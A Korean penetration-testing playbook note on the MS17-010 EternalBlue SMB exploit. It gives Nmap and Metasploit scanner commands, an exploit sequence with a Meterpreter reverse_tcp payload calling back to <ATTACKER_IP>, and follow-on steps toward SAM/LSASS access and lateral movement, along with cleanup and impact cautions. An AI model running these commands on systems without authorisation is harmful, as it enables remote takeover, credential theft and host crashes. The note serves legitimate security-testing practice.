---
tags:
  - 환경/windows
  - 서비스/smb
시작조건: ["SMB 서비스 식별", "MS17-010 영향 가능 Windows 확인"]
필요조건: ["SMB 445 접근 가능", "MS17-010 취약 가능 Windows 버전", "exploit 안정성 검토"]
결과: ["세션", "명령 실행", "SYSTEM 권한"]
---

# MS17-010 EternalBlue SMB RCE

## 한 줄 판단

공격 호스트에서 구형 Windows의 SMB 445번 포트에 연결할 수 있고 비파괴 scanner가 MS17-010 취약 조건을 확인했다면, 시스템 중단 위험과 세션 수신 경로를 검토한 뒤 대상 호스트의 SYSTEM 명령 실행 여부를 검증한다.

## 사용할 때

- SMB 445가 열려 있고 대상이 MS17-010 영향 가능 빌드로 보일 때. 보안 공지의 영향 버전과 현재 설치된 Metasploit module의 지원 target·architecture는 별도로 확인한다.
- SMBv1 또는 MS17-010 관련 취약 신호가 나왔을 때.
- 인증 없이 원격 코드 실행 가능성을 검증해야 할 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| SMB 접근 | 포트 스캔 결과 | `445/tcp open` |
| 취약 가능 OS와 SMBv1 | SMB OS 정보, Nmap 또는 Metasploit scanner | 영향 가능 Windows·SMBv1과 전용 scanner의 취약 표시를 함께 확인. 설치된 module의 `info`, `show targets`, `show payloads` 지원 범위와도 일치해야 함 |
| 패치 상태 | 승인된 호스트 관리 정보 또는 전용 scanner | MS17-010 보안 업데이트가 확인되면 exploit하지 않음 |
| exploit 안정성 | 모듈 설명, 대상 OS/arch 확인 | crash 위험과 payload 조건을 이해한 상태 |

## 확인할 단서

| 단서 | 의미 | 다음 행동 |
|---|---|---|
| `Host is likely VULNERABLE to MS17-010` | 취약 가능성이 높음 | exploit 모듈과 payload 조건 확인 |
| `SMBv1: True` | legacy SMB 공격면 | MS17-010, 취약 Samba/Windows 여부 검토 |
| OS/arch 불명확 | exploit target 선택 위험 | 추가 OS 확인 또는 `check` 우선 |

## 실행

1. SMB OS/버전 단서를 확인한다.
2. MS17-010 전용 비파괴 scanner로 취약 가능성을 검증한다.
3. 설치된 module의 target, payload, architecture를 맞춘 뒤 exploit 실행 여부를 결정한다.
4. 세션을 얻으면 현재 권한과 호스트 안정성을 먼저 확인한다.

교육 원천의 `use 2` 같은 검색 결과 번호는 현재 console의 검색 순서에만 유효하므로 보존하지 않는다. 아래 대표 절차는 `exploit/windows/smb/ms17_010_eternalblue` 전용이다. `ms17_010_psexec`는 다른 exploit primitive와 service·share 동작을 가질 수 있으므로 같은 복구 계약으로 취급하지 않는다.

### 명령과 확인할 출력

#### Metasploit scanner

```bash
nmap -p445 --script smb-vuln-ms17-010 <TARGET>

msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET>
run
```

확인할 출력:

- Nmap의 `State: VULNERABLE` 또는 Metasploit의 `Host is likely VULNERABLE to MS17-010`
- 대상 OS, arch, DOUBLEPULSAR 여부
- SMBv1 노출이나 구형 OS만으로 취약함을 확정하지 않는다. scanner가 사용하는 응답 기반 판정도 exploit 성공이나 호스트 안정성을 보장하지 않는다.

#### exploit 실행

실행 전 현재 session·job 목록을 기록한다. 기존 항목을 종료 대상으로 삼지 않는다.

```text
msf6 > sessions -l
msf6 > jobs -l
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > set RHOSTS <TARGET>
msf6 exploit(...) > set LHOST <ATTACKER_IP>
msf6 exploit(...) > set LPORT <PORT>
msf6 exploit(...) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > info
msf6 exploit(...) > show targets
msf6 exploit(...) > show payloads
msf6 exploit(...) > check
msf6 exploit(...) > run
```

확인할 출력:

- `The target appears to be vulnerable`
- `Meterpreter session opened`
- `sessions -l`에 새로 생긴 `<SESSION_ID>`와 대상·callback 주소. `run -j`를 선택했을 때만 새 `<HANDLER_JOB_ID>`도 기록한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| MS17-010 scanner가 취약 가능성을 명확히 표시한다. | SMB 버전과 패치 상태가 취약 후보에 부합 | 취약 가능성 | [[Public Exploit 검토와 검증]]과 [[metasploit]]에서 대상 조건과 모듈 옵션 재확인 |
| scanner 결과 불명확 | OS/SMB 정보 부족, 방화벽, 패치됨 | 시작 상태 유지 | SMB OS 재확인, 다른 scanner, exploit 보류 |
| `check` 실패 | 패치됨, 대상 빌드 불일치 | 시작 상태 유지 | Public exploit 대신 다른 SMB 공격면 확인 |
| exploit 실패 또는 crash | target/arch/payload 불일치, 취약 조건 미충족 | 시작 상태 유지 | target 설정, payload arch, SMBv1 여부 확인 |
| 세션은 열렸지만 불안정 | exploit 특성상 호스트 불안정 | 시작 상태 유지 | 세션 안정화 후 최소한의 후속 행동 |
| Meterpreter, command shell | 세션 확보 | 세션 | 권한 확인, 파일 수집 |
| `whoami`, `hostname` | 명령 실행 확보 | 명령 실행 | 세션의 호스트, 실행 계정과 무결성 수준 확인 |
| `NT AUTHORITY\SYSTEM` | SYSTEM 권한 확보 | SYSTEM 권한 | SAM/LSASS 확인, 내부 이동 |

## 변경 영향과 복구

이 module은 원격 kernel memory corruption을 유발하고 선택한 payload를 대상 process context에서 실행한다. session 종료는 공격 호스트의 연결과 payload 통신을 끝내는 절차이지 kernel 상태, crash·서비스 불안정, audit 기록을 작업 전 상태로 되돌리는 절차가 아니다. 이 대표 module 절차에서는 업로드 파일이나 임시 service를 만들었다고 가정하지 않는다. 후속 작업에서 생성한 파일·process·설정이 있으면 연결이 살아 있을 때 해당 기법의 exact 복구를 먼저 수행한다.

Meterpreter prompt에서 대상·권한과 후속 원격 정리 상태를 확인한 뒤 session을 background로 보내고, 이번 실행에서 새로 기록한 ID만 종료한다. foreground `run`으로 handler job이 생기지 않았다면 `jobs -k`를 실행하지 않는다.

```text
meterpreter > getuid
meterpreter > sysinfo
meterpreter > getpid
meterpreter > background
msf6 > sessions -l
msf6 > sessions -k <SESSION_ID>
msf6 > sessions -l
msf6 > jobs -l
msf6 > jobs -k <HANDLER_JOB_ID>
msf6 > jobs -l
```

공격 호스트에서 `<SESSION_ID>`·`<HANDLER_JOB_ID>`가 사라지고 `<PORT>` listener가 없어야 local control resource 정리가 확인된다. `getpid`는 payload가 실행된 `<REMOTE_SESSION_PID>`를 식별하기 위한 값이며, 기존 SYSTEM process일 수 있으므로 PID만 보고 `taskkill`하지 않는다. 동일 포트를 쓰는 기존 listener도 이름만으로 종료하지 않는다. `jobs -l`에 이번 ID가 없었다면 job 정리는 해당 없음으로 남긴다.

```bash
ss -lntp | grep -F ':<PORT>'
```

대상에는 SMB 445 응답과 승인된 관리 채널의 host uptime·서비스 상태를 작업 전과 비교한다. session이 이미 끊겼거나 대상 상태를 확인할 관리 경로가 없으면 `원격 복구 미확인`이다. exploit로 발생한 crash, 재부팅, kernel·service 불안정과 audit 기록은 원상복구 불가능하거나 별도 운영 복구가 필요한 영향이며, session·listener가 없다는 이유만으로 원상복구 완료라고 표시하지 않는다.

## 확인할 출력과 권한

- 판정 기준: scanner·`check` 결과와 실제 세션을 구분하고, `getuid` 또는 `whoami`로 SYSTEM 여부를 확인한다.
- 권한 구분: 인증 전·익명·유효 계정 상태를 구분하고, 서비스 응답만으로 실제 권한을 추정하지 않는다.

## 관련 서비스

- [[SMB 서비스]]

## 관련 상태 라우터

- 명령 실행 또는 세션을 확보했으면: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- `NT AUTHORITY\SYSTEM` 실행 컨텍스트를 확인했으면: [[고권한 세션 확보 후 후속 판단]]

## 관련 도구

- [[metasploit]]
- [[meterpreter]]

## 관련 노트

- [[Public Exploit 검토와 검증]]
- [[metasploit]]
- [[Meterpreter 세션 후속 행동]]

## 참고 링크

- [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Microsoft Support — verify that MS17-010 is installed](https://support.microsoft.com/en-us/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)
- [Nmap smb-vuln-ms17-010 NSE documentation](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)
- [Rapid7 Metasploit — ms17_010_eternalblue module](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md)
- [Rapid7 Metasploit — module cleanup contract](https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-cleanup-after-module-execution.md)
